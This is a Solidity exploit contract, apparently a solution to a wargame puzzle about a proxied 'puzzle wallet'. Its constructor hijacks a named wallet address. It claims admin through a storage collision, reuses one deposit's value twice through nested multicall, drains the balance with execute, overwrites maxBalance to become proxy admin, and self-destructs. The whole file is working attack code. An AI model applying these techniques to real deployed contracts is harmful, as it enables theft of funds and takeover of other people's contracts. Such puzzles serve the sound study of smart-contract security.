//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 0xdDeaB43EBdFB48550863fdA88D7D928e4CA61286
// You'll need to hijack this wallet to become the admin of the proxy.
interface IWallet {

    function admin() external view returns(address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable ;
    function multicall(bytes[] calldata data) external payable ;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external ;

}

contract ProxyWalletPwn {


    constructor(IWallet wallet) payable {

        
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory nestedMultiCall = new bytes[](2);
        nestedMultiCall[0] = depositData[0];
        nestedMultiCall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositData);

        //calling deposit function twice in the same transaction using 'nestedMultiCall' bytes array
        // thus sending 0.001 Ether once, but updating our balance twice (0.002)
        wallet.multicall{value: 0.001 ether}(nestedMultiCall);

        wallet.execute(address(this), 0.002 ether, "");

        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(wallet.admin() == msg.sender);

        selfdestruct(payable(msg.sender));
    }


}